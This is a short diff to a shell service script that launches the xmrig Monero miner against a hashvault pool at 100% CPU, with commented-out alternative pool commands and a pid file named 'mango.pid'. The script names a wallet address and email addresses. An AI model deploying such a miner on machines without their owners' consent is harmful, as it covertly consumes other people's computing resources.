@@ -3,7 +3,7 @@
 case "$1" in
 start)
    clear
-   xmrig -a cn/r -R "r" --print-time 10 -o pool.monero.hashvault.pro:3333 -u 478QabHPqryANp56ii7z9QhtUYrLVtEC88j35WgZG7Q2gGXYXrFfDdnVRg8hHj7z8gcH6FNnjFDjYA6rgw2w9dHjRePtmF2 -p adytamasurya@gmail.com -k &
+   xmrig -a cn/r -R "r" --max-cpu-usage 100 --print-time 10 -o pool.monero.hashvault.pro:3333 -u 478QabHPqryANp56ii7z9QhtUYrLVtEC88j35WgZG7Q2gGXYXrFfDdnVRg8hHj7z8gcH6FNnjFDjYA6rgw2w9dHjRePtmF2 -p adytamasurya@gmail.com -k &
    #xmrig -a cryptonight/r --print-time 7 --max-cpu-usage 100 -o xmr.pool.minergate.com:45700 -u adynikez@gmail.com -p x -k &
    #xmrig --max-cpu-usage 60 -o pool.sumokoin.com:3333 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37PhpeakUndXx1622PaJNSJE -p x -k &
    echo $!>/var/run/mango.pid
